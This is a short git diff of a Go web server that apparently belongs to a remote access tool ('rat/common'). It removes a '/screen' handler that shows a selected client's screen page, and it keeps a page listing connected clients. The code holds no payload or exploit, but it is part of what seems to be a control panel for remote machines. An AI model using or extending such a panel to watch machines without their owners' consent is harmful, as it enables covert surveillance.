@@ -5,7 +5,6 @@ import (
 	"log"
 	"net/http"
 	"rat/common"
-	"strconv"
 )
 
 type ClientPage struct {
@@ -41,15 +40,6 @@ func main() {
 		t := template.Must(template.New("clients.template.html").Funcs(funcMap).ParseFiles("web/clients.template.html"))
 
 		err := t.Execute(w, &Clients)
-
-		if err != nil {
-			panic(err)
-		}
-	})
-	http.HandleFunc("/screen", func(w http.ResponseWriter, r *http.Request) {
-		t := template.Must(template.New("screen.html").ParseFiles("web/screen.html", "web/template.html"))
-		id, _ := strconv.Atoi(r.FormValue("id"))
-		err := t.Execute(w, NewSingle(get(id)))
 
 		if err != nil {
 			panic(err)
